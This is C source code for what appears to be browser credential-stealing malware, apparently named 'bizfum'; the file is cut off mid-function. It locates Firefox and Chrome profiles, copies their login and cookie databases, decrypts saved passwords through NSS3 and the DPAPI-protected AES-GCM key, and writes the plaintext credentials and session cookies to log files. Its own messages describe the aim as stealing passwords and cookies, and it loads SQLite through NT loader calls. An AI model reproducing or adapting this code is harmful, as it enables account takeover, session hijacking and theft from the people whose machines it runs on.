#include "./../../include/global.h"
#include "./../../include/browsers.h"

int Firefox(char* folder_where_to_save_data, char* current_username) {
    OKAY("Firefox is installed. Trying to steal Firefox paswords and cookies...");

    // Check existance of nss3. Gecko-based browsers use the Mozilla developed NSS3 library to encrypt data. 
    // So logically thinking, if Firefox is installed, so is nss3.dll binary.
    char nss3[51];
    if (GetFileAttributesA("C:\\Program Files\\Mozilla Firefox\\nss3.dll") != INVALID_FILE_ATTRIBUTES && 
        !(GetFileAttributesA("C:\\Program Files\\Mozilla Firefox\\nss3.dll") & FILE_ATTRIBUTE_DIRECTORY))
    {
        strcpy(nss3, "C:\\Program Files\\Mozilla Firefox");
    }
    else if (GetFileAttributesA("C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll") != INVALID_FILE_ATTRIBUTES && 
        !(GetFileAttributesA("C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll") & FILE_ATTRIBUTE_DIRECTORY))
    {
        strcpy(nss3, "C:\\Program Files (x86)\\Mozilla Firefox");
    } else { WARN("Could not find nss3.dll file."); return 1; }


    // Password related variables.
    char SrcFirefoxDB[MAX_PATH]; snprintf(SrcFirefoxDB, sizeof(SrcFirefoxDB), "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*", current_username);

    // Cookie related variables.
    char CookiesOutputFile[MAX_PATH]; snprintf(CookiesOutputFile, sizeof(CookiesOutputFile), "%s\\Firefox Cookies.log", folder_where_to_save_data);

    // Find the right Firefox profile.
    HANDLE hFileFind;
    WIN32_FIND_DATAA FirstFile, NextFile;
    hFileFind = FindFirstFileA(SrcFirefoxDB, &FirstFile);
    if (hFileFind == INVALID_HANDLE_VALUE) { return 1; }
    do {
        const char *fileOrDir = FirstFile.cFileName;
        if (strcmp(fileOrDir, ".") != 0 && strcmp(fileOrDir, "..") != 0) {
            if (FirstFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                char potential[MAX_PATH];
                snprintf(potential, sizeof(potential), "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\%s\\logins.json", current_username, fileOrDir);
                if (GetFileAttributesA(potential) != INVALID_FILE_ATTRIBUTES &&  !(GetFileAttributesA(potential) & FILE_ATTRIBUTE_DIRECTORY)) {
                    snprintf(SrcFirefoxDB, sizeof(SrcFirefoxDB), "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\%s\\logins.json", current_username, fileOrDir);
                    break;
                }

            }
        }
    } while (FindNextFileA(hFileFind, &FirstFile));
    FindClose(hFileFind);

    // Call the actual function for Gecko-based browsers. Use type 1 to get the saved passwords.
    if (GeckoBasedDecryption(nss3, SrcFirefoxDB, folder_where_to_save_data, 1) == 0) {
        char OutPath[MAX_PATH];
        snprintf(OutPath, sizeof(OutPath), "%s\\Firefox Passwords.log", folder_where_to_save_data);
        OKAY("Got no errors. So we can suppose everything went well. You should find the decrypted passwords for Firefox in %s\n", OutPath);
    }
    

    // Call the actual function for Gecko-based browsers. Use type 2 to get the saved cookies.
    if (GeckoBasedDecryption(nss3, SrcFirefoxDB, CookiesOutputFile, 2) == 0) {
        OKAY("Got no errors. So we can suppose everything went well. You should find the saved cookies for Firefox in %s\n", CookiesOutputFile);
    }
    
}

int Chrome(char* folder_where_to_save_data, char* current_username) {
    OKAY("Chrome is installed. Trying to steal Chrome paswords and cookies...");

    // Variable to store secret key.
    char Base64EncodedDPAPIkey[500];
    // Password related variables
    char srcChromeDB[MAX_PATH]; snprintf(srcChromeDB, sizeof(srcChromeDB), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", current_username);
    char dstChromeDB[MAX_PATH]; snprintf(dstChromeDB, sizeof(dstChromeDB), "%s\\AppData\\Local\\Temp\\bizfum\\Chrome.db", current_username);
    char KeyFileChrome[MAX_PATH]; snprintf(KeyFileChrome, sizeof(KeyFileChrome), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", current_username);
    char PasswordsOutputFile[MAX_PATH]; snprintf(PasswordsOutputFile, sizeof(PasswordsOutputFile), "%s\\Chrome Passwords.log", folder_where_to_save_data);
    // Cookies related variables.
    char srcChromeCookieDB[MAX_PATH]; snprintf(srcChromeCookieDB, sizeof(srcChromeCookieDB), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", current_username);
    char dstChromeCookieDB[MAX_PATH]; snprintf(dstChromeCookieDB, sizeof(dstChromeCookieDB), "%s\\AppData\\Local\\Temp\\bizfum\\ChromeCookies.db", current_username);
    char CookiesOutputFile[MAX_PATH]; snprintf(CookiesOutputFile, sizeof(CookiesOutputFile), "%s\\Chrome Cookies.log", folder_where_to_save_data);

    // Get the key for the actual secret key decryption.
    // Chrome uses a few security mechanisms. It first AES-GCM-256 encrypts passwords with a generated key, which after it uses DPAPI encryption on that key
    // DPAPI is used because then you can't just steal the passwords and the key and decrypt on other computer as easily.
    if (ChromiumBasedKey(KeyFileChrome, Base64EncodedDPAPIkey) != 0) { WARN("Error occured in retreiving of key"); return 1; }
    INFO("Found DPAPI encrypted key");


    // Try and copy the database, sicne if it's being used by another proccess (Chrome), it will cause an error when trying to open.
    INFO("Trying to move Chrome password database, in case of it already being read...");
    FILE *sourceFile, *destinationFile;
    char buffer[1024];
    if ((sourceFile = fopen(srcChromeDB, "rb")) == NULL) { 
        printf("The Chrome database is probably being read by another process, could not open!\n");
        return 1; 
    }
    if ((destinationFile = fopen(dstChromeDB, "wb")) == NULL) { 
        WARN("Had problems writing to %s!\n", dstChromeDB); 
        fclose(sourceFile); 
        return 1; 
    }
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), sourceFile)) > 0) { fwrite(buffer, 1, bytesRead, destinationFile); }
    fclose(sourceFile);
    fclose(destinationFile);
    // Decrypt saved passwords, if any. The function takes in 5 values;
    // Chrome Database Path && Output File Path && DPAPI Encrypted key && The SQLite3 DB Query && Type of The Data stolen (1 = Logins, 2 = Cookies, 3 = History)
    if (ChromiumBasedDecryptionV10(dstChromeDB, PasswordsOutputFile, Base64EncodedDPAPIkey, "SELECT origin_url, username_value, password_value FROM logins", 1) != 0) { WARN("Error in Chrome decrypting."); return 1;}
    OKAY("Got no errors. So we can suppose everything went well. You should find the decrypted passwords for Chrome in %s\n", PasswordsOutputFile);


    // Cookie time
    INFO("Trying to steal cookies from %s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies...", current_username);
    INFO("Trying to move Chrome Cookie database, in case of it already being read...");
    FILE *sourceFile1, *destinationFile1;
    char buffer1[1024];
    if ((sourceFile1 = fopen(srcChromeCookieDB, "rb")) == NULL) { WARN("The Chrome database is probably being read by another process, could not open!\n"); fclose(destinationFile1); return 1; }
    if ((destinationFile1 = fopen(dstChromeCookieDB, "wb")) == NULL) { WARN("Had problems writing to %s!\n", dstChromeDB); fclose(sourceFile1); return 1; }
    size_t bytesRead1;
    while ((bytesRead1 = fread(buffer1, 1, sizeof(buffer1), sourceFile1)) > 0) { fwrite(buffer1, 1, bytesRead1, destinationFile1); }
    fclose(sourceFile1);
    fclose(destinationFile1);
    if (ChromiumBasedDecryptionV10(dstChromeCookieDB, CookiesOutputFile, Base64EncodedDPAPIkey, "SELECT creation_utc, host_key, name, encrypted_value, expires_utc, last_access_utc FROM cookies", 2) != 0) { WARN("Error in Chrome decrypting."); return 1;}
    OKAY("Got no huge errors. So we can suppose everything went well for the most part. You should find the decrypted passwords for Chrome in %s\n", CookiesOutputFile);
    return 0;

}

void Edge(char* folder_where_to_save_data, char* current_username) {
    OKAY("Edge is installed\n");
}

void Brave(char* folder_where_to_save_data, char* current_username) {
    printf("Brave is installed\n");
}

void Yandex(char* folder_where_to_save_data, char* current_username) {
    printf("Yandex is installed\n");
}

void Opera(char* folder_where_to_save_data, char* current_username) {
    printf("Opera is installed\n");
}


// Extra needed Functions.
int GeckoBasedDecryption(char *NSS3_PATH, char *logins_json, char *data_storage, int type) {
    if (type == 1) {
        INFO("Starting to decrypt Firefox passwords...");
        // Read the data from logins.json file.
        char *bufferLogins = 0;
        long length;
        FILE *fLogins = fopen(logins_json, "rb");
        if (fLogins)
        {
            fseek(fLogins, 0, SEEK_END);
            length = ftell(fLogins);
            fseek(fLogins, 0, SEEK_SET);
            bufferLogins = malloc(length);
            if (bufferLogins)
            {
                fread(bufferLogins, 1, length, fLogins);
            }
            fclose(fLogins);
        }
        // Find first occurrence of '  "logins":[   ' and then split the rest from "},{".
        char *ptrOccu = strstr(bufferLogins, "\"logins\":[");
        if (ptrOccu == NULL) { return 1; }
        size_t IndexS = (ptrOccu - bufferLogins) + strlen("\"logins\":[");
        memmove(bufferLogins, bufferLogins + IndexS, strlen(bufferLogins + IndexS) + 1);

        // Find end and cut it out
        char *ptrOccu2 = strstr(bufferLogins, "}],\"");
        if (ptrOccu2 == NULL) { return 1; }
        size_t IndexE = (ptrOccu2 - bufferLogins) + 1;
        bufferLogins[IndexE] = '\0';

        // Make a file for writing the Firefox data to.
        char PasswordStorage[MAX_PATH]; snprintf(PasswordStorage, sizeof(PasswordStorage), "%s\\Firefox Passwords.log", data_storage);
        FILE *FirefoxFile = fopen(PasswordStorage, "w");
        fprintf(FirefoxFile, "┳┓  ┳  ┏┓  ┏┓  ┳┳  ┳┳┓    ╻    ┓  ┏┓ ┏┓ ┏┓\n┣┫  ┃  ┏┛  ┣   ┃┃  ┃┃┃    ┃    ┃  ┃┃ ┃┓ ┗┓\n┻┛  ┻  ┗┛  ┻   ┗┛  ┛ ┗    ╹    ┗┛ ┗┛ ┗┛ ┗┛\n                                   \n");

        // Put the ExomF path to the .
        // Split the JSON into tokens and start decrypting the passwords.
        char *token = strstr(bufferLogins, "},{");

        // Change Directory
        INFO("Changing Directory to a directory where nss3.dll exists: %s", NSS3_PATH);
        TCHAR Buffer[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, Buffer);
        SetCurrentDirectory(NSS3_PATH);

        // Add "sql:" prefix to logins path and remove last 13 characters ("\\logins.json").
        char temp_logins_json[MAX_PATH];
        strcpy(temp_logins_json, logins_json);
        temp_logins_json[strlen(logins_json) - 12] = '\0';
        char PROFILE[MAX_PATH]; snprintf(PROFILE, sizeof(PROFILE), "sql:%s", temp_logins_json);

        // Output Pointer
        char *usernameDecrypted = NULL;
        char *passwordDecrypted = NULL;

        while (token != NULL)
        {
            char hostname[256];
            char username[256];
            char password[256];
            // Here starts the loop through the JSON, let's put the fields into variables.
            char *ptrToken = malloc(token - bufferLogins + 1);
            sprintf(ptrToken, "%.*s", (int)(token - bufferLogins), bufferLogins);
            ManualGeckoRegex(ptrToken, hostname, username, password);
            fprintf(FirefoxFile, "---> Hostname: %s\n", hostname);

            int success = Decrypt_NSS3(PROFILE, username, &usernameDecrypted);
            if (success == 0)
            {
                fprintf(FirefoxFile, "---> Username: %s", usernameDecrypted);
                free(usernameDecrypted);
            }

            int success2 = Decrypt_NSS3(PROFILE, password, &passwordDecrypted);
            if (success2 == 0)
            {
                fprintf(FirefoxFile, "---> Password: %s\n\n", passwordDecrypted);
                free(passwordDecrypted);
            }
            free(ptrToken);
            bufferLogins = token + 2;
            token = strstr(bufferLogins, "},{");
        }

        char *LastUsernameDecrypted = NULL;
        char *LastPasswordDecrypted = NULL;
        char hostname[256];
        char username[256];
        char password[256];
        ManualGeckoRegex(bufferLogins, hostname, username, password);
        fprintf(FirefoxFile, "---> Hostname: %s\n", hostname);

        int last_success = Decrypt_NSS3(PROFILE, username, &LastUsernameDecrypted);
        if (last_success == 0)
        {
            fprintf(FirefoxFile, "---> Username: %s", LastUsernameDecrypted);
            free(LastUsernameDecrypted);
        }

        int last_success2 = Decrypt_NSS3(PROFILE, password, &LastPasswordDecrypted);
        if (last_success2 == 0)
        {
            fprintf(FirefoxFile, "---> Password: %s", LastPasswordDecrypted);
            free(LastPasswordDecrypted);
        }
        fclose(FirefoxFile);
        SetCurrentDirectory(Buffer);
    }
    if (type == 2) {
        INFO("Starting logging of Firefox cookies...");
        // Open output file for writing.
        char temp_logins_json[MAX_PATH];
        strcpy(temp_logins_json, logins_json);
        temp_logins_json[strlen(logins_json) - 11] = '\0';
        char CookieDatabase[MAX_PATH]; snprintf(CookieDatabase, sizeof(CookieDatabase), "%scookies.sqlite", temp_logins_json);
        FILE *output = fopen(data_storage, "w");
        if (output == NULL) { WARN("Error: Unable to open file."); return -1; }

        // Load the winsqlite3.dll library dynamically + using NtAPI version of LoadLibrary() and then get the addresses of the functions NtAPI version of GetProcAddress().
        UNICODE_STRING dllName;
        WCHAR dllNameBuffer[] = L"winsqlite3.dll"; // Name of the DLL (winsqlite3.dll here)
        dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
        dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
        dllName.Buffer = dllNameBuffer;
        ULONG dllCharacteristics = 0;
        PVOID moduleHandle = NULL;
        NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
        if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) { return -1; }
        INFO("Loaded winsqlite3.dll");

        // The getting of the function addresses is pretty heavy job, so I wont add comments.
        ANSI_STRING procName1;
        NTSTATUS status1;
        PVOID sqlite3_openProcAddress = NULL;
        CHAR procNameBuffer_open[] = "sqlite3_open";
        procName1.Length = (USHORT)strlen(procNameBuffer_open);
        procName1.MaximumLength = procName1.Length + 1;
        procName1.Buffer = procNameBuffer_open;
        status1 = GetProcAdd(moduleHandle, &procName1, 0, &sqlite3_openProcAddress);
        if (!NT_SUCCESS(status1) || sqlite3_openProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_openFunc sqlite3_open = (sqlite3_openFunc)sqlite3_openProcAddress;

        ANSI_STRING procName2;
        NTSTATUS status2;
        PVOID sqlite3_prepare_v2ProcAddress = NULL;
        CHAR procNameBuffer_prepare_v2[] = "sqlite3_prepare_v2";
        procName2.Length = (USHORT)strlen(procNameBuffer_prepare_v2);
        procName2.MaximumLength = procName2.Length + 1;
        procName2.Buffer = procNameBuffer_prepare_v2;
        status2 = GetProcAdd(moduleHandle, &procName2, 0, &sqlite3_prepare_v2ProcAddress);
        if (!NT_SUCCESS(status2) || sqlite3_prepare_v2ProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_prepare_v2Func sqlite3_prepare_v2 = (sqlite3_prepare_v2Func)sqlite3_prepare_v2ProcAddress;

        ANSI_STRING procName3;
        NTSTATUS status3;
        PVOID sqlite3_stepProcAddress = NULL;
        CHAR procNameBuffer_step[] = "sqlite3_step";
        procName3.Length = (USHORT)strlen(procNameBuffer_step);
        procName3.MaximumLength = procName3.Length + 1;
        procName3.Buffer = procNameBuffer_step;
        status3 = GetProcAdd(moduleHandle, &procName3, 0, &sqlite3_stepProcAddress);
        if (!NT_SUCCESS(status3) || sqlite3_stepProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_stepFunc sqlite3_step = (sqlite3_stepFunc)sqlite3_stepProcAddress;

        ANSI_STRING procName4;
        NTSTATUS status4;
        PVOID sqlite3_column_textProcAddress = NULL;
        CHAR procNameBuffer_column_text[] = "sqlite3_column_text";
        procName4.Length = (USHORT)strlen(procNameBuffer_column_text);
        procName4.MaximumLength = procName4.Length + 1;
        procName4.Buffer = procNameBuffer_column_text;
        status4 = GetProcAdd(moduleHandle, &procName4, 0, &sqlite3_column_textProcAddress);
        if (!NT_SUCCESS(status4) || sqlite3_column_textProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_column_textFunc sqlite3_column_text = (sqlite3_column_textFunc)sqlite3_column_textProcAddress;

        ANSI_STRING procName5;
        NTSTATUS status5;
        PVOID sqlite3_column_intProcAddress = NULL;
        CHAR procNameBuffer_column_int[] = "sqlite3_column_int";
        procName5.Length = (USHORT)strlen(procNameBuffer_column_int);
        procName5.MaximumLength = procName5.Length + 1;
        procName5.Buffer = procNameBuffer_column_int;
        status5 = GetProcAdd(moduleHandle, &procName5, 0, &sqlite3_column_intProcAddress);
        if (!NT_SUCCESS(status5) || sqlite3_column_intProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_column_intFunc sqlite3_column_int = (sqlite3_column_intFunc)sqlite3_column_intProcAddress;

        ANSI_STRING procName6;
        NTSTATUS status6;
        PVOID sqlite3_finalizeProcAddress = NULL;
        CHAR procNameBuffer_finalize[] = "sqlite3_finalize";
        procName6.Length = (USHORT)strlen(procNameBuffer_finalize);
        procName6.MaximumLength = procName6.Length + 1;
        procName6.Buffer = procNameBuffer_finalize;
        status6 = GetProcAdd(moduleHandle, &procName6, 0, &sqlite3_finalizeProcAddress);
        if (!NT_SUCCESS(status6) || sqlite3_finalizeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_finalizeFunc sqlite3_finalize = (sqlite3_finalizeFunc)sqlite3_finalizeProcAddress;

        ANSI_STRING procName7;
        NTSTATUS status7;
        PVOID sqlite3_closeProcAddress = NULL;
        CHAR procNameBuffer_close[] = "sqlite3_close";
        procName7.Length = (USHORT)strlen(procNameBuffer_close);
        procName7.MaximumLength = procName7.Length + 1;
        procName7.Buffer = procNameBuffer_close;
        status7 = GetProcAdd(moduleHandle, &procName7, 0, &sqlite3_closeProcAddress);
        if (!NT_SUCCESS(status7) || sqlite3_closeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_closeFunc sqlite3_close = (sqlite3_closeFunc)sqlite3_closeProcAddress;

        ANSI_STRING procName8;
        NTSTATUS status8;
        PVOID sqlite3_column_blobProcAddress = NULL;
        CHAR procNamesqlite3_column_blob[] = "sqlite3_column_blob";
        procName8.Length = (USHORT)strlen(procNamesqlite3_column_blob);
        procName8.MaximumLength = procName8.Length + 1;
        procName8.Buffer = procNamesqlite3_column_blob;
        status8 = GetProcAdd(moduleHandle, &procName8, 0, &sqlite3_column_blobProcAddress);
        if (!NT_SUCCESS(status8) || sqlite3_column_blobProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_column_blobFunc sqlite3_column_blob = (sqlite3_column_blobFunc)sqlite3_column_blobProcAddress;

        ANSI_STRING procName9;
        NTSTATUS status9;
        PVOID sqlite3_column_bytesProcAddress = NULL;
        CHAR procNamesqlite3_column_bytes[] = "sqlite3_column_bytes";
        procName9.Length = (USHORT)strlen(procNamesqlite3_column_bytes);
        procName9.MaximumLength = procName9.Length + 1;
        procName9.Buffer = procNamesqlite3_column_bytes;
        status9 = GetProcAdd(moduleHandle, &procName9, 0, &sqlite3_column_bytesProcAddress);
        if (!NT_SUCCESS(status9) || sqlite3_column_bytesProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
        sqlite3_column_bytesFunc sqlite3_column_bytes = (sqlite3_column_bytesFunc)sqlite3_column_bytesProcAddress;


        INFO("Got addresses of functions");

        // Now we start looping through the url, usernames and passwords.
        sqlite3 *db;
        sqlite3_stmt *stmt;
        sqlite3_open(CookieDatabase, &db);
        sqlite3_prepare_v2(db, "SELECT creationTime, host, name, value, expiry, lastAccessed FROM moz_cookies", -1, &stmt, NULL);
        fprintf(output, "┳┓  ┳  ┏┓  ┏┓  ┳┳  ┳┳┓    ╻    ┓  ┏┓ ┏┓ ┏┓\n┣┫  ┃  ┏┛  ┣   ┃┃  ┃┃┃    ┃    ┃  ┃┃ ┃┓ ┗┓\n┻┛  ┻  ┗┛  ┻   ┗┛  ┛ ┗    ╹    ┗┛ ┗┛ ┗┛ ┗┛\n                                   \n");
        while (sqlite3_step(stmt) != SQLITE_DONE) {
            if ( (strlen(sqlite3_column_text(stmt, 3)) < 15) || strcmp(sqlite3_column_text(stmt, 3), "_ga") == 0 || strcmp(sqlite3_column_text(stmt, 3), "_gid") == 0 ) {
                continue; // Skip cookies that are under 15 characters long or are some of the most common tracking cookies.
            }
            fprintf(output, "===============================================================\nHost: %s\nCookie Name: %s\nCookie Value: %s\nCreation time: %s\nLast access datetime: %s\nExpires datetime: %s\n===============================================================\n\n", sqlite3_column_text(stmt, 1), sqlite3_column_text(stmt, 2), sqlite3_column_text(stmt, 3), firefox_timestamp_to_string(sqlite3_column_text(stmt, 0)), firefox_timestamp_to_string(sqlite3_column_text(stmt, 5)), firefox_timestamp_to_string(sqlite3_column_text(stmt, 4)));
        }
        fclose(output);
        sqlite3_finalize(stmt);
        sqlite3_close(db);
    }
    return 0;
}
int ChromiumBasedKey(char *CLS_Path, char *key_location) {
    // Get the key from the Local State file.
    char *key;
    char *encrypted_key = NULL;
    FILE *file = fopen(CLS_Path, "r");
    static char buffer[4096];
    while (fgets(buffer, sizeof(buffer), file))
    {
        char *ptr = strstr(buffer, "\"encrypted_key\":\"");
        if (ptr)
        {
            ptr += strlen("\"encrypted_key\":\"");
            char *end = strchr(ptr, '\"');
            if (end)
            {
                size_t len = end - ptr;
                encrypted_key = malloc(len + 1);
                strncpy(encrypted_key, ptr, len);
                encrypted_key[len] = '\0';
                key = encrypted_key;
                fclose(file);
                break;
            }
        }
    }
    fclose(file);
    strncpy(key_location, key, 499);
    key_location[499] = '\0';
    free(key);
    return 0;
}
int ChromiumBasedDecryptionV10(char *logindata, char *storage, char *key, char *sqlite_query, int type) {
    // Open output file for writing.
    FILE* output = fopen(storage, "w");
    if (output == NULL) { WARN("Error: Unable to open file."); return -1; }

    // Load the winsqlite3.dll library dynamically + using NtAPI version of LoadLibrary() and then get the addresses of the functions NtAPI version of GetProcAddress().

    UNICODE_STRING dllName;
    WCHAR dllNameBuffer[] = L"winsqlite3.dll"; // Name of the DLL (winsqlite3.dll here)
    dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
    dllName.MaximumLength = dllName.Length + sizeof(WCHAR);
    dllName.Buffer = dllNameBuffer;
    ULONG dllCharacteristics = 0;
    PVOID moduleHandle = NULL;
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) { return -1; }
    INFO("Loaded winsqlite3.dll");

    // The getting of the function addresses is pretty heavy job, so I wont add comments.
    ANSI_STRING procName1;
    NTSTATUS status1;
    PVOID sqlite3_openProcAddress = NULL;
    CHAR procNameBuffer_open[] = "sqlite3_open";
    procName1.Length = (USHORT)strlen(procNameBuffer_open);
    procName1.MaximumLength = procName1.Length + 1;
    procName1.Buffer = procNameBuffer_open;
    status1 = GetProcAdd(moduleHandle, &procName1, 0, &sqlite3_openProcAddress);
    if (!NT_SUCCESS(status1) || sqlite3_openProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_openFunc sqlite3_open = (sqlite3_openFunc)sqlite3_openProcAddress;

    ANSI_STRING procName2;
    NTSTATUS status2;
    PVOID sqlite3_prepare_v2ProcAddress = NULL;
    CHAR procNameBuffer_prepare_v2[] = "sqlite3_prepare_v2";
    procName2.Length = (USHORT)strlen(procNameBuffer_prepare_v2);
    procName2.MaximumLength = procName2.Length + 1;
    procName2.Buffer = procNameBuffer_prepare_v2;
    status2 = GetProcAdd(moduleHandle, &procName2, 0, &sqlite3_prepare_v2ProcAddress);
    if (!NT_SUCCESS(status2) || sqlite3_prepare_v2ProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_prepare_v2Func sqlite3_prepare_v2 = (sqlite3_prepare_v2Func)sqlite3_prepare_v2ProcAddress;

    ANSI_STRING procName3;
    NTSTATUS status3;
    PVOID sqlite3_stepProcAddress = NULL;
    CHAR procNameBuffer_step[] = "sqlite3_step";
    procName3.Length = (USHORT)strlen(procNameBuffer_step);
    procName3.MaximumLength = procName3.Length + 1;
    procName3.Buffer = procNameBuffer_step;
    status3 = GetProcAdd(moduleHandle, &procName3, 0, &sqlite3_stepProcAddress);
    if (!NT_SUCCESS(status3) || sqlite3_stepProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_stepFunc sqlite3_step = (sqlite3_stepFunc)sqlite3_stepProcAddress;

    ANSI_STRING procName4;
    NTSTATUS status4;
    PVOID sqlite3_column_textProcAddress = NULL;
    CHAR procNameBuffer_column_text[] = "sqlite3_column_text";
    procName4.Length = (USHORT)strlen(procNameBuffer_column_text);
    procName4.MaximumLength = procName4.Length + 1;
    procName4.Buffer = procNameBuffer_column_text;
    status4 = GetProcAdd(moduleHandle, &procName4, 0, &sqlite3_column_textProcAddress);
    if (!NT_SUCCESS(status4) || sqlite3_column_textProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_column_textFunc sqlite3_column_text = (sqlite3_column_textFunc)sqlite3_column_textProcAddress;

    ANSI_STRING procName5;
    NTSTATUS status5;
    PVOID sqlite3_column_intProcAddress = NULL;
    CHAR procNameBuffer_column_int[] = "sqlite3_column_int";
    procName5.Length = (USHORT)strlen(procNameBuffer_column_int);
    procName5.MaximumLength = procName5.Length + 1;
    procName5.Buffer = procNameBuffer_column_int;
    status5 = GetProcAdd(moduleHandle, &procName5, 0, &sqlite3_column_intProcAddress);
    if (!NT_SUCCESS(status5) || sqlite3_column_intProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_column_intFunc sqlite3_column_int = (sqlite3_column_intFunc)sqlite3_column_intProcAddress;

    ANSI_STRING procName6;
    NTSTATUS status6;
    PVOID sqlite3_finalizeProcAddress = NULL;
    CHAR procNameBuffer_finalize[] = "sqlite3_finalize";
    procName6.Length = (USHORT)strlen(procNameBuffer_finalize);
    procName6.MaximumLength = procName6.Length + 1;
    procName6.Buffer = procNameBuffer_finalize;
    status6 = GetProcAdd(moduleHandle, &procName6, 0, &sqlite3_finalizeProcAddress);
    if (!NT_SUCCESS(status6) || sqlite3_finalizeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_finalizeFunc sqlite3_finalize = (sqlite3_finalizeFunc)sqlite3_finalizeProcAddress;

    ANSI_STRING procName7;
    NTSTATUS status7;
    PVOID sqlite3_closeProcAddress = NULL;
    CHAR procNameBuffer_close[] = "sqlite3_close";
    procName7.Length = (USHORT)strlen(procNameBuffer_close);
    procName7.MaximumLength = procName7.Length + 1;
    procName7.Buffer = procNameBuffer_close;
    status7 = GetProcAdd(moduleHandle, &procName7, 0, &sqlite3_closeProcAddress);
    if (!NT_SUCCESS(status7) || sqlite3_closeProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_closeFunc sqlite3_close = (sqlite3_closeFunc)sqlite3_closeProcAddress;

    ANSI_STRING procName8;
    NTSTATUS status8;
    PVOID sqlite3_column_blobProcAddress = NULL;
    CHAR procNamesqlite3_column_blob[] = "sqlite3_column_blob";
    procName8.Length = (USHORT)strlen(procNamesqlite3_column_blob);
    procName8.MaximumLength = procName8.Length + 1;
    procName8.Buffer = procNamesqlite3_column_blob;
    status8 = GetProcAdd(moduleHandle, &procName8, 0, &sqlite3_column_blobProcAddress);
    if (!NT_SUCCESS(status8) || sqlite3_column_blobProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_column_blobFunc sqlite3_column_blob = (sqlite3_column_blobFunc)sqlite3_column_blobProcAddress;

    ANSI_STRING procName9;
    NTSTATUS status9;
    PVOID sqlite3_column_bytesProcAddress = NULL;
    CHAR procNamesqlite3_column_bytes[] = "sqlite3_column_bytes";
    procName9.Length = (USHORT)strlen(procNamesqlite3_column_bytes);
    procName9.MaximumLength = procName9.Length + 1;
    procName9.Buffer = procNamesqlite3_column_bytes;
    status9 = GetProcAdd(moduleHandle, &procName9, 0, &sqlite3_column_bytesProcAddress);
    if (!NT_SUCCESS(status9) || sqlite3_column_bytesProcAddress == NULL) { UnloadLib(moduleHandle); return -2; }
    sqlite3_column_bytesFunc sqlite3_column_bytes = (sqlite3_column_bytesFunc)sqlite3_column_bytesProcAddress;


    INFO("Got addresses of functions");

    // Now we start looping through the url, usernames and passwords.
    sqlite3 *db;
    sqlite3_stmt *stmt;
    sqlite3_open(logindata, &db);
    sqlite3_prepare_v2(db, sqlite_query, -1, &stmt, NULL);
    fprintf(output, "┳┓  ┳  ┏┓  ┏┓  ┳┳  ┳┳┓    ╻    ┓  ┏┓ ┏┓ ┏┓\n┣┫  ┃  ┏┛  ┣   ┃┃  ┃┃┃    ┃    ┃  ┃┃ ┃┓ ┗┓\n┻┛  ┻  ┗┛  ┻   ┗┛  ┛ ┗    ╹    ┗┛ ┗┛ ┗┛ ┗┛\n                                   \n");
    if (type == 1) {
        while (sqlite3_step(stmt) != SQLITE_DONE) {
            char password[256];
            const void *blob_data = sqlite3_column_blob(stmt, 2);
            int lenencpass = sqlite3_column_bytes(stmt, 2);
            if ( ! (lenencpass == 31 && strlen(sqlite3_column_text(stmt, 1)) == 0)   ) {
                fprintf(output, "---> Hostname: %s\n", sqlite3_column_text(stmt, 0));
                if ( strlen(sqlite3_column_text(stmt, 1)) == 0 ) {
                    fprintf(output, "---> Username: (null)\n");
                } else {
                    fprintf(output, "---> Username: %s\n", sqlite3_column_text(stmt, 1));
                }
                if ( lenencpass == 31 ) {
                    fprintf(output, "---> Password: (null)\n\n\n");
                } else {
                    AES_256_GCM_Setup(key, blob_data, lenencpass, password);
                    fprintf(output, "---> Password: %s\n\n\n", password);
                }
            }
        }
    } else if (type == 2) {
        while (sqlite3_step(stmt) != SQLITE_DONE) {
            char cookie[8192];
            const void *cookie_blob_data = sqlite3_column_blob(stmt, 3);
            int lenenccookie = sqlite3_column_bytes(stmt, 3);
            if ( ((lenenccookie - 31) < 15) || ((lenenccookie - 31) == 32) || strcmp(sqlite3_column_text(stmt, 2), "_ga") == 0 || strcmp(sqlite3_column_text(stmt, 2), "_gid") == 0 ) {
                continue; // Skip cookies that are under 15 characters long or are some of the most common tracking cookies.
            }

